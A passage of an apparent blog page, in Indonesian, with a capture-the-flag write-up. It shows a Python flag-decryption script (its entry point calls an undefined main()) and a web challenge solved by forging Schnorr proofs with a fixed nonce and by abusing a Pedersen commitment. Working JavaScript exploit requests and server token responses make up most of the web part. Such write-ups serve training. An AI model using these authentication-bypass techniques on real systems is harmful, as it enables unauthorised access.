+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_flag</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;&#34;&#34;Decrypt flag menggunakan algoritma yang ditemukan di binary&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="c1"># Encrypted data dari binary (address: main.flag)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">encrypted</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&amp;+</span><span class="se">\x1f</span><span class="s2">$7/</span><span class="se">\&#34;\x1e\x17</span><span class="s2">&amp;$</span><span class="se">\x1a\x13</span><span class="s2">#</span><span class="se">\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13</span><span class="s2">#&#34;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="c1"># Decryption algorithm dari reverse engineering:</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># flag[i] = encrypted[i] + i + 64</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_char</span> <span class="o">=</span> <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">64</span>  <span class="c1"># 64 = &#39;@&#39; ASCII</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">decrypted_char</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Decrypt flag</span>
+</span></span><span class="line"><span class="cl">  <span class="n">flag</span> <span class="o">=</span> <span class="n">decrypt_flag</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Encrypted bytes found at address: 0x9A2100 (main.flag)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Decryption algorithm: flag[i] = encrypted[i] + i + 64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="c1"># Show step-by-step</span>
+</span></span><span class="line"><span class="cl">  <span class="n">encrypted</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&amp;+</span><span class="se">\x1f</span><span class="s2">$7/</span><span class="se">\&#34;\x1e\x17</span><span class="s2">&amp;$</span><span class="se">\x1a\x13</span><span class="s2">#</span><span class="se">\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13</span><span class="s2">#&#34;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Step-by-step decryption:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">70</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">enc</span> <span class="o">=</span> <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dec</span> <span class="o">=</span> <span class="n">enc</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">dec</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  [</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">2d</span><span class="si">}</span><span class="s2">]  0x</span><span class="si">{</span><span class="n">enc</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">enc</span><span class="si">:</span><span class="s2">3d</span><span class="si">}</span><span class="s2">) + </span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">2d</span><span class="si">}</span><span class="s2"> + 64 = </span><span class="si">{</span><span class="n">dec</span><span class="si">:</span><span class="s2">3d</span><span class="si">}</span><span class="s2"> = &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag --&gt; </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">flag</span> <span class="o">=</span> <span class="n">main</span><span class="p">()</span></span></span></code></pre></div></div>
+<h3 id="flag-3">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>flag{the_one_piece_is_real}</code></div>
+        </div>
+    </div>
+<hr>
+<h1 id="web-14">Web [1/4]</h1>
+<h2 id="nolnol">nolnol</h2>
+<h3 id="langkah-penyelesaian-4">Langkah Penyelesaian</h3>
+<p><strong>🔍 Initial Reconnaissance</strong></p>
+<p><strong>Stage 0: Discovery</strong></p>
+<p>Mengakses URL utama menampilkan halaman &ldquo;The Protocol Gate&rdquo; dengan form untuk memulai challenge. Analisis awal menunjukkan tiga tahapan:</p>
+<ol>
+<li><strong>Stage 1:</strong> Zero-Knowledge Authentication</li>
+<li><strong>Stage 2:</strong> Hidden Commitments</li>
+<li><strong>Stage 3:</strong> Circuit Verification</li>
+</ol>
+<p><strong>Endpoint Discovery</strong></p>
+<p>Melakukan scanning endpoint untuk menemukan API yang tersedia:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Endpoint yang ditemukan:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">/api/stage1/challenge  // POST - Mendapatkan challenge</span>
+</span></span><span class="line"><span class="cl"><span class="err">/api/stage1/prove      // POST - Submit proof</span>
+</span></span><span class="line"><span class="cl"><span class="err">/api/stage2/check      // POST - Check vault status</span>
+</span></span><span class="line"><span class="cl"><span class="err">/api/stage2/reveal     // POST - Reveal hidden data</span>
+</span></span><span class="line"><span class="cl"><span class="err">/api/stage3/circuit-info    // GET - Get circuit info</span>
+</span></span><span class="line"><span class="cl"><span class="err">/api/stage3/submit-proof    // POST - Submit witness</span></span></span></code></pre></div></div>
+<p><strong>🎯 Stage 1: Zero-Knowledge Authentication (Schnorr Protocol)</strong></p>
+<p><strong>Vulnerability Analysis</strong></p>
+<p>Stage 1 menggunakan <strong>Schnorr Signature Protocol</strong> untuk authentication. Server memberikan public key dan session ID, kemudian meminta client untuk membuat valid proof tanpa mengetahui private key.</p>
+<p><strong>Protocol Normal:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>1. Client: R = g^k (k = random nonce)
+2. Server: c = H(R, m)  (challenge)
+3. Client: s = k + c*x  (response, x = private key)
+4. Verify: g^s = R * PK^c</code></pre></div>
+<p><strong>Exploitation</strong></p>
+<p>Setelah testing berbagai format proof, ditemukan bahwa server menerima format:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sessionId&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;session_id&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;commitment&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;x&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;x_coord&gt;&#34;</span><span class="p">,</span> <span class="nt">&#34;y&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;y_coord&gt;&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;response&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;scalar&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>Critical Vulnerability:</strong> Server menggunakan <strong>weak/predictable nonce k = 1</strong>!</p>
+<p>Ketika nonce = 1:</p>
+<ul>
+<li>Commitment R = G^1 = <strong>Generator Point</strong> secp256k1</li>
+<li>Response s = 1</li>
+</ul>
+<p>Generator point secp256k1:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Gx = 79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798
+Gy = 483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</code></pre></div>
+<p><strong>Exploit Code</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">bypassStage1</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get challenge
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/stage1/challenge&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Session ID:&#34;</span><span class="p">,</span> <span class="nx">session</span><span class="p">.</span><span class="nx">sessionId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Forge proof with k=1 (generator point)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">proof</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">sessionId</span><span class="o">:</span> <span class="nx">session</span><span class="p">.</span><span class="nx">sessionId</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">commitment</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">x</span><span class="o">:</span> <span class="s2">&#34;79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">y</span><span class="o">:</span> <span class="s2">&#34;483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">response</span><span class="o">:</span> <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/stage1/prove&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">proof</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Stage 1 Token:&#34;</span><span class="p">,</span> <span class="nx">result</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">result</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Authentication successful! The vault is unlocked...&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;token&#34;</span><span class="p">:</span> <span class="s2">&#34;6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;nextStage&#34;</span><span class="p">:</span> <span class="s2">&#34;/vault&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>-&gt; <strong>Stage 1 Token:</strong> <code>6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e</code></p>
+<p><strong>🔓 Stage 2: Hidden Commitments (Pedersen Commitment)</strong></p>
+<p><strong>Vulnerability Analysis</strong></p>
+<p>Stage 2 menggunakan <strong>Pedersen Commitment</strong> untuk menyembunyikan data dalam vault. Sistem mengklaim vault kosong, namun commitment memiliki 256 bits - mencurigakan untuk data kosong.</p>
+<p><strong>Pedersen Commitment Formula:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>C = g^m · h^r</code></pre></div>
+<p>Di, mana:</p>
+<ul>
+<li><code>m</code> = message (data)</li>
+<li><code>r</code> = blinding factor (seharusnya rahasia)</li>
+</ul>
+<p>HTML comment memberikan hint:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
+</span></span></span><span class="line"><span class="cl"><span class="c">  空虚ではない (Not empty)
+</span></span></span><span class="line"><span class="cl"><span class="c">  Blinding factor structure: [random_bits || hidden_data]
+</span></span></span><span class="line"><span class="cl"><span class="c">  Analyze the commitment length. Does it match an &#34;empty&#34; vault?
+</span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span></span></span></code></pre></div></div>
+<p><strong>Check Vault Status</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="s2">&#34;6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">checkResp</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/stage2/check&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">token</span> <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span></span></span></code></pre></div></div>
+<p><strong>Response:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;vaultStatus&#34;</span><span class="p">:</span> <span class="s2">&#34;empty&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;commitment&#34;</span><span class="p">:</span> <span class="s2">&#34;6d61bd6f38b7220657a836881aa323ab09f35299ba54653a7308caf025bdfb3f&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;The vault appears to be empty... or is it?&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;dataLength&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;checksum&#34;</span><span class="p">:</span> <span class="s2">&#34;a2e4822a98337283e39f7b60acf85ec9&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;commitmentBits&#34;</span><span class="p">:</span> <span class="mi">256</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>Exploitation</strong></p>
+<p><strong>Critical Vulnerability:</strong> Server menggunakan <strong>commitment itu sendiri sebagai blinding factor</strong>!</p>
+<p>Dalam implementasi Pedersen Commitment yang benar, blinding factor harus tetap rahasia dan tidak dapat di-derive dari commitment. Namun server menggunakan arsitektur yang cacat.</p>
+<p><strong>Exploit Code</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">bypassStage2</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="s2">&#34;6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check vault first
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">checkData</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/stage2/check&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">token</span> <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">commitment</span> <span class="o">=</span> <span class="nx">checkData</span><span class="p">.</span><span class="nx">commitment</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Commitment:&#34;</span><span class="p">,</span> <span class="nx">commitment</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Use commitment as blinding factor (vulnerability!)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">revealData</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/stage2/reveal&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> 
+</span></span><span class="line"><span class="cl">            <span class="nx">token</span><span class="o">:</span> <span class="nx">token</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="nx">blinding</span><span class="o">:</span> <span class="nx">commitment</span>  <span class="c1">// &lt;-- Key exploit!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Stage 2 Token:&#34;</span><span class="p">,</span> <span class="nx">revealData</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">revealData</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;The vault was never empty...&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;hint&#34;</span><span class="p">:</span> <span class="s2">&#34;Look deeper into the structure. Circuit verification awaits.&#34;</span><span class="p">,</span>
